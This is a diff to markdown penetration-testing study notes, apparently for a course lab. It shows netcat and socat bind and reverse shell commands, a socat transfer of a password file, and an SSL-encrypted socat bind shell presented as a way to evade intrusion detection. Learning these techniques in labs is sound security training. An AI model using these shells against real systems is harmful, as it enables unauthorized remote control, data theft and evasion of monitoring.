@@ -129,18 +129,84 @@ Windows &rarr; Linux
 
 _4. Remote Administration with Netcat_
 
-NetCat Bind Shell 
+##NetCat Bind Shell 
 
 _DGaping security hole_
 
-- client
+- client(Bon)
 ```bash
 nc -nlvp 4444 -e cmd.exe
 ```
-- attacker
+- Helper(Alice)
 ```bash
 nc -nv 10.11.0.22 4444
 ```
 ![Bind Shell](https://i.imgur.com/uryYaJa.png)
 
+---
+##NetCat Reverse Shell 
 
+- client(Alice)
+```bash
+nc -nlvp 4444
+```
+- helper(Bob)
+```bash
+nc -nv 10.11.0.22 4444 -e /bin/bash
+```
+![Reverse Shell](https://i.imgur.com/jeTs3lq.png)
+---
+#Socat
+- It is a command-line utlity that establishes tow bidirectional byte streams and transfers data between them. For Penetration testing.
+- It is similar to Netcat but has additional useful features.
+
+## Netcat vs Socat
+- connection mode:(chat)
+```bash
+nc <remote server's ip address> 80 
+socat - TCP4:<remote sever's ip address>:80
+```
+_note: we require root privilege to bind listener to ports below 1024_
+- listening mode:(chat)
+```bash
+sudo nc -lvp localhost 443
+sudo socat TCP4-LISTEN:443 STDOUT
+```
+##Socat File Transfers
+Alice need to send Bob 
+- Linux &rarr; Windows
+ - On Linux 
+     - ```bash
+     sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
+ ```
+ - On Windows
+     - ```bash
+     socat TCP4:10.11.0.4.:443 file:received_secret_passwords.txt,create
+     ```
+---
+## Socat Reverse Shells
+- On window
+```bash
+    socat -d TCP4-LISTEN:443 STDOUT
+```
+- On Linux
+```bash
+    socat TCP4:<IP address>:443 EXEC:/bin/bash
+```
+## Socat Encrypt Bind Shells
+_Note:- Secure Socket Layer certificates. 
+This level of encryption will assist in evading intrusion detection system(IDS) and will help hide the sensitive data we are transceiving._
+![](https://i.imgur.com/rJRoHmo.png)
+![](https://i.imgur.com/tYfIwOT.png)
+- Creating self-signed certificate
+
+```bash
+openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
+
+cat bind_shell.key bind_shell.crt > bind_shell.pem
+```
+
+- Listening using SSL
+```bash
+sudo socat OPENSSL-LISTEN:443,cert-bind_shell.pem, verify=0,fork EXEC:/bin/bash
+```
